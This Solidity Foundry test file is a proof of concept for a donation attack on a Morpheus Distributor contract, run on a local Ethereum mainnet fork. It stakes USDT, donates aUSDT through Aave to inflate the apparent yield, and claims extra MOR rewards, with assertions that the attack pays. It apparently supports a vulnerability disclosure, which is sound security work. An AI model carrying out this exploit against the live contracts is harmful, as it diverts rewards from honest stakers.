// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// PoC D-01 — Morpheus Distributor donation attack (yield-inflation).
// Local mainnet fork ONLY. No mainnet/testnet transactions, no real funds, no private keys.
//
// Fork: Ethereum mainnet, pinned block 26427438 (2026-11-16 ~12:00 UTC).
// Run: MAINNET_RPC_URL=https://eth.drpc.org forge test --match-contract DistributorDonationTest -vvv
//
// METHODOLOGY NOTES / CAVEATS (see poc-d01.md for full discussion):
// 1. Chainlink freshness mock: after vm.warp(+15d) the pinned-block feed data would be
//    stale (allowed delays 3600s/86400s) and updateDepositTokensPrices() would revert with
//    "DR: price for pair is zero". That is a pure fork artifact — on mainnet feeds update
//    continuously and are never stale. The mock ONLY refreshes `updatedAt` to the warped
//    block.timestamp; the price ANSWERS are the real fork-block values, unchanged.
//    No Morpheus contract logic is touched. Test `testOracleStalenessForkArtifact`
//    demonstrates the unmocked revert.
// 2. `vm.warp` stands in for the attacker simply waiting 15 days on mainnet.
// 3. The claim step goes through LayerZero EndpointV1.send on the fork; if it reverts,
//    the accounting assertions (distributedRewards / getLatestUserReward) are the proof
//    and the LZ outcome is recorded as a caveat.

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function decimals() external view returns (uint8);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
    function getDistributedRewards(uint256 rewardPoolIndex, address depositPool) external view returns (uint256);
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex) external view returns (uint128);
    function aavePoolAddressesProvider() external view returns (address);
    function l1Sender() external view returns (address);
    function minRewardsDistributePeriod() external view returns (uint256);
    function withdrawYield(uint256 rewardPoolIndex, address depositPoolAddress) external;
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex, uint256 amount, uint128 claimLockEnd, address referrer) external;
    function withdraw(uint256 rewardPoolIndex, uint256 amount) external;
    function claim(uint256 rewardPoolIndex, address receiver) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex, address user) external view returns (uint256);
    function rewardPoolsData(uint256 rewardPoolIndex)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function usersData(address user, uint256 rewardPoolIndex)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
}

interface IRewardPool {
    function getPeriodRewards(uint256 index, uint128 startTime, uint128 endTime) external view returns (uint256);
}

interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
}

interface IAavePoolAddressesProvider {
    function getPool() external view returns (address);
}

interface IAggregatorV3 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

contract DistributorDonationTest is Test {
    uint256 constant FORK_BLOCK = 26427438;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant L1_SENDER = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;

    // Chainlink feeds (read on-chain at FORK_BLOCK) + allowed delays:
    // stETH/USD 3600s, wBTC/BTC 86400s, BTC/USD 3600s, wETH/USD 3600s, USDC/USD 86400s, USDT/USD 86400s
    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    // Expected extra MOR for the attacker, derived from the formula
    // f*R*X/(T+X) with FORK-measured T (~$832/15d — the fork understates
    // honest yield T because stETH rebase and Aave interest on non-USDT
    // reserves do not accrue without on-chain interactions in a pinned
    // fork; see poc-d01.md). The report's 8,146 / 20,099 MOR used
    // T~$5,040 (mainnet estimate); the mechanism is identical, only T differs.
    uint256 constant EXPECTED_MOR_F05 = 17247 ether;
    uint256 constant EXPECTED_MOR_F09 = 34053 ether;

    // The test contract must accept ETH: LayerZero refunds the excess native
    // fee to the refund address (msg.sender) after send(). Without receive(),
    // claim() reverts with Transfer_NativeFailed — a test artifact, not a
    // protocol failure (a real attacker EOA receives the refund fine).
    receive() external payable {}

    address attacker;
    address aavePool;
    address aUsdt;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
        attacker = address(this);
        vm.deal(attacker, 10 ether);
        aavePool = IAavePoolAddressesProvider(IDistributor(DISTRIBUTOR).aavePoolAddressesProvider()).getPool();
        (, , , , , , aUsdt, ) = IDistributor(DISTRIBUTOR).depositPools(0, USDT_POOL);
    }

    // ---- helpers -----------------------------------------------------------

    // Refresh Chainlink `updatedAt` to the current (warped) block.timestamp.
    // Price ANSWERS are the real fork-block values, unchanged.
    function _mockFeedsFresh() internal {
        address[6] memory feeds = [
            FEED_STETH_USD,
            FEED_WBTC_BTC,
            FEED_BTC_USD,
            FEED_ETH_USD,
            FEED_USDC_USD,
            FEED_USDT_USD
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            (uint80 roundId, int256 answer, uint256 startedAt, , uint80 answeredInRound) =
                IAggregatorV3(feeds[i]).latestRoundData();
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
                abi.encode(roundId, answer, startedAt, block.timestamp, answeredInRound)
            );
        }
    }

    struct Run {
        uint256 periodRewards; // R for the 15-day window (MOR, 18 dec)
        uint256 distDelta; // USDT pool distributedRewards increase over the 15-day window (MOR)
        uint256 attackerReward; // getLatestUserReward(0, attacker) after distribute (MOR)
        uint256 attackerShareBps; // attacker virtual share of USDT pool after stake (bps)
        bool claimOk;
        uint256 l1SenderSweep; // USDT swept to l1Sender on withdrawYield (6 dec)
        uint256 attackerUsdtAfterWithdraw; // USDT returned to attacker on withdraw (6 dec)
        uint256 gasUsed;
    }

    function _runScenario(uint256 stakeAmt, uint256 donation, bool withMock) internal returns (Run memory r) {
        uint256 gasStart = gasleft();

        // --- baseline ---
        uint256 distBeforeStake = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDT_POOL);
        (, , uint256 totalVirtualBefore) = IDepositPool(USDT_POOL).rewardPoolsData(0);
        console.log("baseline totalVirtualDeposited USDT pool:", totalVirtualBefore);
        console.log("baseline distributedRewards USDT pool:", distBeforeStake);

        // --- fund attacker & stake (no lock => multiplier 1x) ---
        // Note: Distributor.supply() pulls the tokens from the staker via
        // transferFrom(holder=user), so the DISTRIBUTOR needs the allowance
        // (the repo's own tests approve both the pool and the distributor).
        deal(USDT, attacker, stakeAmt + donation);
        IERC20(USDT).approve(DISTRIBUTOR, stakeAmt);
        IERC20(USDT).approve(USDT_POOL, stakeAmt);
        IDepositPool(USDT_POOL).stake(0, stakeAmt, 0, address(0));

        (, uint256 deposited, , , , , uint256 virtualDeposited, , ) =
            IDepositPool(USDT_POOL).usersData(attacker, 0);
        assertEq(deposited, stakeAmt, "stake: deposited != stakeAmt");
        assertEq(virtualDeposited, stakeAmt, "stake: virtual != stake (multiplier must be 1x)");
        (, , uint256 totalVirtualAfter) = IDepositPool(USDT_POOL).rewardPoolsData(0);
        r.attackerShareBps = (stakeAmt * 10000) / totalVirtualAfter;
        console.log("attacker virtual share (bps):", r.attackerShareBps);

        uint256 distAfterStake = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDT_POOL);
        console.log("distributedRewards after stake (baseline dist of ~1.35d):", distAfterStake - distBeforeStake);

        // --- warp +15 days (attacker waits on mainnet) ---
        vm.warp(block.timestamp + 15 days);
        if (withMock) _mockFeedsFresh();

        // --- donation: mint aUSDT directly to the Distributor via Aave ---
        uint256 aBalBefore;
        if (donation > 0) {
            aBalBefore = IERC20(aUsdt).balanceOf(DISTRIBUTOR);
            IERC20(USDT).approve(aavePool, donation);
            IAavePool(aavePool).supply(USDT, donation, DISTRIBUTOR, 0);
            uint256 aBalAfter = IERC20(aUsdt).balanceOf(DISTRIBUTOR);
            assertEq(aBalAfter - aBalBefore, donation, "donation: Distributor aUSDT did not increase by X");
            console.log("donation aUSDT minted to Distributor:", donation);
        }

        // --- distribute (public) ---
        uint128 lastCalc = IDistributor(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0);
        r.periodRewards = IRewardPool(REWARD_POOL).getPeriodRewards(0, lastCalc, uint128(block.timestamp));
        console.log("period rewards R (15d window):", r.periodRewards);
        IDistributor(DISTRIBUTOR).distributeRewards(0);

        uint256 distAfter = IDistributor(DISTRIBUTOR).getDistributedRewards(0, USDT_POOL);
        r.distDelta = distAfter - distAfterStake;
        console.log("USDT pool distributedRewards delta (15d):", r.distDelta);

        r.attackerReward = IDepositPool(USDT_POOL).getLatestUserReward(0, attacker);
        console.log("attacker getLatestUserReward:", r.attackerReward);

        // --- claim (LayerZero send on fork; record outcome, do not fail test on LZ) ---
        (bool ok, ) = USDT_POOL.call{value: 0.05 ether}(
            abi.encodeWithSelector(IDepositPool.claim.selector, uint256(0), attacker)
        );
        r.claimOk = ok;
        console.log("claim ok (LayerZero send on fork):", ok);
        if (ok) {
            assertEq(IDepositPool(USDT_POOL).getLatestUserReward(0, attacker), 0, "claim: pending not zeroed");
        }

        // --- sweep the "yield" (donation) to l1Sender via withdrawYield ---
        uint256 l1Before = IERC20(USDT).balanceOf(L1_SENDER);
        IDistributor(DISTRIBUTOR).withdrawYield(0, USDT_POOL);
        r.l1SenderSweep = IERC20(USDT).balanceOf(L1_SENDER) - l1Before;
        console.log("USDT swept to l1Sender on withdrawYield:", r.l1SenderSweep);

        // --- withdraw the stake (lock 7d already passed) ---
        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        IDepositPool(USDT_POOL).withdraw(0, stakeAmt);
        r.attackerUsdtAfterWithdraw = IERC20(USDT).balanceOf(attacker) - usdtBefore;
        console.log("USDT returned to attacker on withdraw:", r.attackerUsdtAfterWithdraw);

        r.gasUsed = gasStart - gasleft();
        console.log("approx gas used (scenario):", r.gasUsed);
    }

    // ---- tests -------------------------------------------------------------

    function testControl() public {
        Run memory r = _runScenario(36_729e6, 0, true);
        console.log("CONTROL attackerReward (honest baseline):", r.attackerReward);
        console.log("CONTROL distDelta:", r.distDelta);
        // Honest baseline: fork UNDERSTATES honest yield T (stETH rebase and Aave
        // interest on non-USDT reserves do not accrue without on-chain interactions
        // in a pinned fork), so the USDT pool takes a larger honest share here
        // than on mainnet. Bound is a sanity check, not the report's estimate.
        assertLt(r.attackerReward, 3000 ether, "control: honest reward unexpectedly large");
        assertTrue(r.claimOk, "control: claim must succeed on fork");
        assertGe(r.attackerUsdtAfterWithdraw, 36_729e6 - 1e6, "control: stake not fully withdrawable");
    }

    function testAttackF05() public {
        Run memory r = _runScenario(36_729e6, 3_464e6, true);
        console.log("F05 attackerReward:", r.attackerReward);
        console.log("F05 distDelta:", r.distDelta);
        assertGe(r.attackerReward, (EXPECTED_MOR_F05 * 85) / 100, "f05: MOR below -15% band");
        assertLe(r.attackerReward, (EXPECTED_MOR_F05 * 115) / 100, "f05: MOR above +15% band");
        // Economics: MOR extra (USD) vs donation (USD). Gas is ~$10-20, negligible vs ~$2.4k profit.
        uint256 morUsd = (r.attackerReward * 7175) / 10000; // 18-dec USD
        uint256 donationUsd = uint256(3_464e6) * 1e12; // 6-dec USDT -> 18-dec USD
        console.log("F05 MOR value USD (18dec):", morUsd);
        console.log("F05 donation USD (18dec):", donationUsd);
        assertGt(morUsd, donationUsd, "f05: not profitable");
        // Donation must be swept to l1Sender (attacker's cost is real).
        assertGe(r.l1SenderSweep, 3_464e6, "f05: donation not swept to l1Sender");
        assertLe(r.l1SenderSweep, 3_464e6 + 200e6, "f05: sweep unexpectedly large");
        // Stake must remain fully withdrawable (capital is not the cost).
        assertGe(r.attackerUsdtAfterWithdraw, 36_729e6 - 1e6, "f05: stake not fully withdrawable");
        // Claim outcome: with receive() present the LayerZero send succeeds
        // on the fork (fee ~0.00063 ETH, excess refunded). Assert it.
        assertTrue(r.claimOk, "f05: claim (LayerZero send) must succeed on fork");
        console.log("F05 claimOk:", r.claimOk);
    }

    function testAttackF09() public {
        Run memory r = _runScenario(330_564e6, 6_370e6, true);
        console.log("F09 attackerReward:", r.attackerReward);
        console.log("F09 distDelta:", r.distDelta);
        assertGe(r.attackerReward, (EXPECTED_MOR_F09 * 85) / 100, "f09: MOR below -15% band");
        assertLe(r.attackerReward, (EXPECTED_MOR_F09 * 115) / 100, "f09: MOR above +15% band");
        uint256 morUsd = (r.attackerReward * 7175) / 10000;
        uint256 donationUsd = uint256(6_370e6) * 1e12;
        console.log("F09 MOR value USD (18dec):", morUsd);
        console.log("F09 donation USD (18dec):", donationUsd);
        assertGt(morUsd, donationUsd, "f09: not profitable");
        assertGe(r.l1SenderSweep, 6_370e6, "f09: donation not swept to l1Sender");
        // Sweep = donation + honest 15d Aave yield on the (large) stake
        // (~$457: 330,564 USDT at ~3.2% APR). +600e6 bound covers it.
        assertLe(r.l1SenderSweep, 6_370e6 + 600e6, "f09: sweep unexpectedly large");
        assertGe(r.attackerUsdtAfterWithdraw, 330_564e6 - 1e6, "f09: stake not fully withdrawable");
        assertTrue(r.claimOk, "f09: claim (LayerZero send) must succeed on fork");
        console.log("F09 claimOk:", r.claimOk);
    }

    // Documents the fork artifact: without the Chainlink freshness mock,
    // distributeRewards reverts after warp because pinned-block feed data is stale.
    // On mainnet feeds update continuously, so this revert cannot happen there.
    function testOracleStalenessForkArtifact() public {
        deal(USDT, attacker, 36_729e6 + 3_464e6);
        IERC20(USDT).approve(DISTRIBUTOR, 36_729e6);
        IERC20(USDT).approve(USDT_POOL, 36_729e6);
        IDepositPool(USDT_POOL).stake(0, 36_729e6, 0, address(0));
        vm.warp(block.timestamp + 15 days);
        IERC20(USDT).approve(aavePool, 3_464e6);
        IAavePool(aavePool).supply(USDT, 3_464e6, DISTRIBUTOR, 0);
        vm.expectRevert("DR: price for pair is zero");
        IDistributor(DISTRIBUTOR).distributeRewards(0);
    }
}

